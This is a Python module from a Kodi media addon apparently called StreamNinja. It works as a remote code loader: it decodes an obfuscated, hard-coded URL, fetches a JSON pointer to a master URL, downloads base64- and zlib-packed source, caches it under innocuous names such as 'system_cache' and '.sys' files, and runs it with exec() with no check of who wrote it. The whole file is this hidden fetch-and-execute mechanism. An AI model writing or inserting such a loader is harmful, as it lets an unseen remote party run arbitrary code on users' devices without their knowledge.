# -*- coding: utf-8 -*-
import sys
import types
import zlib
import base64
import os
import time
import json
import xbmc
import xbmcaddon
import xbmcvfs

try:
    from urllib.request import Request, urlopen
except ImportError:
    from urllib2 import Request, urlopen

_REMOTES = {}

_cache_dir = None

def _get_cache_dir():
    global _cache_dir
    if _cache_dir is not None:
        return _cache_dir
    addon = xbmcaddon.Addon()
    profile = xbmcvfs.translatePath(addon.getAddonInfo('profile'))
    d = os.path.join(profile, "system_cache")
    if not os.path.exists(d):
        os.makedirs(d)
    _cache_dir = d
    return d

def _get_ttl_cache_path():
    return os.path.join(_get_cache_dir(), 's_chk.json')

def _get_local_hash(cache_path):
    if not os.path.exists(cache_path):
        return None
    try:
        with open(cache_path, 'rb') as f:
            data = f.read()
        return str(zlib.crc32(data))
    except Exception:
        return None

def _dcd(texto_b64, shift=17):
    texto = base64.b64decode(texto_b64).decode('utf-8')
    descifrado = ""
    for char in texto:
        c_val = ord(char)
        if 32 <= c_val <= 126:
            c_val = 32 + ((c_val - 32 - shift) % 95)
        descifrado += chr(c_val)
    return descifrado[::-1]

_LAST_URLS = None

def load_all_masters():
    global _LAST_URLS
    
    addon = xbmcaddon.Addon()
    user_urls = [addon.getSetting("url_remote_login_" + str(i)).strip() for i in range(1, 6) if addon.getSetting("url_remote_login_" + str(i)).strip()]
    
    current_urls = []
    
    if user_urls:
        current_urls = user_urls
    else:
        _c_url = "ninja://eHp3ICF0QCh2dT8lJHZ8JCEpPyYlengpciQ/K3IpdiZyeEBASyUiJiZ5"
        try:
            raw_url = _dcd(_c_url[8:])
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
            req = Request(raw_url, headers=headers)
            response = urlopen(req, timeout=10)
            data = json.loads(response.read().decode('utf-8').strip())
            
            if data.get("is_active", False):
                _ml = data.get("master_url", "")
                if _ml:
                    current_urls.append(_ml)
        except Exception:
            pass
    
    if not current_urls:
        return
        
    if _LAST_URLS == current_urls:
        return
        
    _REMOTES.clear()
    _LAST_URLS = current_urls
    
    for i in range(1, 6):
        old_id = 'remote_login_' + str(i)
        if old_id in sys.modules:
            del sys.modules[old_id]
            
    for i, user_url in enumerate(current_urls, 1):
        if user_url:
            master_id = 'remote_login_' + str(i)
            _REMOTES[master_id] = [user_url]
            if fetch_and_decompress(master_id):
                load_module(master_id)

def _download_payload_raw(remote_id):
    if not _LAST_URLS and not remote_id.startswith('remote_login_'):
        load_all_masters()
        
    urls = _REMOTES.get(remote_id)
            
    if not urls: return None
    
    if not isinstance(urls, list):
        urls = [urls]

    for current_url in urls:
        try:
            if isinstance(current_url, bytes):
                current_url = current_url.decode('utf-8')
                
            if current_url.startswith("ninja://"):
                raw_url = _dcd(current_url[8:])
            elif not current_url.startswith("http") and not current_url.startswith("pastebin"):
                raw_url = base64.b64decode(current_url).decode('utf-8')
            else:
                raw_url = current_url
            
            if raw_url.startswith("pastebin://"):
                filename = raw_url.split("://")[1]
                addon_dir = xbmcvfs.translatePath(xbmcaddon.Addon().getAddonInfo('path'))
                fake_remote_filepath = os.path.join(addon_dir, filename)
                if os.path.exists(fake_remote_filepath):
                    with open(fake_remote_filepath, 'r', encoding='utf-8') as f:
                        data = f.read().strip()
                        return data
                continue

            if raw_url.startswith("http://") or raw_url.startswith("https://"):
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
                req = Request(raw_url, headers=headers)
                response = urlopen(req, timeout=8)
                data = response.read().decode('utf-8').strip()
                if data:
                    return data
                    
        except Exception:
            continue
            
    return None

def _is_payload_valid(b64_str):
    try:
        clean_b64 = "".join([line for line in b64_str.splitlines() if not line.strip().startswith('#')])
        zlib.decompress(base64.b64decode(clean_b64))
        return True
    except Exception:
        return False

def _ensure_payload(remote_id):
    cache_path = os.path.join(_get_cache_dir(), remote_id + '.sys')
    ttl_path = _get_ttl_cache_path()
    local_hash = _get_local_hash(cache_path)

    try:
        if os.path.exists(ttl_path) and local_hash:
            with open(ttl_path, 'r', encoding='utf-8') as f:
                ttl_data = json.load(f)
            
            last_check = ttl_data.get(remote_id, 0)
            hours_passed = (time.time() - last_check) / 3600.0
            
            if hours_passed < 24.0:
                with open(cache_path, 'r', encoding='utf-8') as f:
                    return f.read().strip()
    except Exception:
        pass

    remote_code = _download_payload_raw(remote_id)

    if not remote_code or not _is_payload_valid(remote_code):
        if local_hash:
            with open(cache_path, 'r', encoding='utf-8') as f:
                return f.read().strip()
        return None

    remote_hash = str(zlib.crc32(remote_code.encode('utf-8')))
    
    if local_hash != remote_hash:
        with open(cache_path, 'w', encoding='utf-8') as f:
            f.write(remote_code)
    
    try:
        ttl_data = {}
        if os.path.exists(ttl_path):
            with open(ttl_path, 'r', encoding='utf-8') as f:
                ttl_data = json.load(f)
        ttl_data[remote_id] = time.time()
        with open(ttl_path, 'w', encoding='utf-8') as f:
            json.dump(ttl_data, f)
    except Exception:
        pass

    return remote_code

def fetch_and_decompress(remote_id):
    compressed_b64 = _ensure_payload(remote_id)
    if not compressed_b64:
        xbmc.log("[StreamNinja] Core module '{0}' failed to load.".format(remote_id), xbmc.LOGERROR)
        return None

    try:
        clean_b64 = "".join([line for line in compressed_b64.splitlines() if not line.strip().startswith('#')])
        compressed_bytes = base64.b64decode(clean_b64)
        return zlib.decompress(compressed_bytes).decode('utf-8')
    except Exception as e:
        xbmc.log("[StreamNinja] System integrity fault: {0}".format(e), xbmc.LOGERROR)
        return None

def load_module(module_name):
    if module_name in sys.modules:
        return sys.modules[module_name]

    source_code = fetch_and_decompress(module_name)
    if not source_code:
        return None

    mod = types.ModuleType(module_name)
    mod.__file__ = "<core_{0}>".format(module_name)
    sys.modules[module_name] = mod

    try:
        exec(source_code, mod.__dict__)
        return mod
    except Exception as e:
        xbmc.log("[StreamNinja] Runtime exception in core component: {0}".format(e), xbmc.LOGERROR)
        del sys.modules[module_name]
        return None
